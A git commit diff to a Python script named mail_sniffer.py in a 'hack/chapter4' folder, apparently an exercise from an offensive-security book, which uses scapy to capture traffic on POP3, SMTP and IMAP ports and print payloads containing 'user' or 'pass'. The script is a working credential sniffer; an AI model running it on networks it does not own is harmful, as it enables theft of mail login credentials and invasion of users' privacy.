c4312b3368950f8f5119bb0ce7488154c8e304e5
Caratpine <bepox0531@gmail.com>
2018-04-17 23:04:19 +0800

    .

--- hack/chapter4/mail_sniffer.py
+++ hack/chapter4/mail_sniffer.py
@@ -6,10 +6,10 @@ from scapy.all import sniff, TCP, IP
 def packet_callback(packet):
     if packet[TCP].payload:
         mail_packet = str(packet[TCP].payload)
+        print "[*] Server: {}".format(packet[IP].dst)
         if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
-            print "[*] Server: {}".format(packet[IP].dst)
             print "[*] {}".format(packet[TCP].payload)
 
 
-sniff(filter="tcp port 110 or tcp port 25 or tcp port 443",
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",
       prn=packet_callback, store=0)
